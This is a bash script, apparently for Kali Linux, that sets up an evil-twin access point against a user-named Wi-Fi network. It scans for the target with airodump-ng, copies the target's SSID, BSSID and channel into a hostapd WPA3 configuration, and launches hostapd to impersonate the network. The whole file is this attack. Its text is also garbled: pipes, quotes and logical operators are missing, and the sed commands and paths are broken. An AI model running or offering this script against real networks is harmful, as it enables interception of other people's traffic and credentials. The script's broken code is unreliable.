#!/bin/bash

CONF_FILE=home/kali/Downloads/hostapd-2.9/hostapd/wpa3.conf
HOSTAPD_DIR=home/kali/Downloads/hostapd-2.9/hostapd

echo [+] Detection of wireless interface …
INTERFACE=$(iw dev  awk '$1==Interface{print $2}'  head -n 1)

if [[ -z $INTERFACE ]]; then
    echo [-] Wireless interface not found!
    exit 1
fi
echo [+] Using interface $INTERFACE

echo [+] Enabling monitore mode ...
sudo airmon-ng check kill
sudo service network-manager stop
sudo rfkill unblock wifi
sudo ip link set $INTERFACE down
sudo iw dev $INTERFACE set type monitor
sudo ip link set $INTERFACE up

read -p Enter network name (ESSID)  TARGET_ESSID

rm -f scan_results

echo [+] Searching for Wi-Fi network ...
sudo timeout 10 airodump-ng $INTERFACE --output-format csv -w scan_results

 
BSSID=$(grep $TARGET_ESSID scan_results-01.csv  awk -F',' '{print $1}'  tr -d ' '  head -n 1)
CHANNEL=$(grep $TARGET_ESSID scan_results-01.csv  awk -F',' '{print $4}'  tr -d ' '  head -n 1)

if [[ -z $BSSID  -z $CHANNEL  $CHANNEL == 0 ]]; then
    echo [-] Network with ESSID not found $TARGET_ESSID
    sudo ip link set $INTERFACE down
    sudo iw dev $INTERFACE set type managed
    sudo ip link set $INTERFACE up
    sudo systemctl restart NetworkManager
    exit 1
fi

echo [+] Found BSSID=$BSSID, CHANNEL=$CHANNEL

echo [+] Enabling managed mode...
sudo ip link set $INTERFACE down
sudo iw dev $INTERFACE set type managed
sudo ip link set $INTERFACE up
#sudo systemctl restart NetworkManager

echo [+] Updating the .conf file with new data $CONF_FILE
sed -i s^interface=.interface=$INTERFACE $CONF_FILE
sed -i s^ssid=.ssid=$TARGET_ESSID $CONF_FILE
sed -i s^bssid=.bssid=$BSSID $CONF_FILE
sed -i s^channel=.channel=$CHANNEL $CONF_FILE
echo [+] Configuration file successfully updated!
echo [+] Enabling hostapd...
cd $HOSTAPD_DIR
sudo .hostapd wpa3.conf -dd –K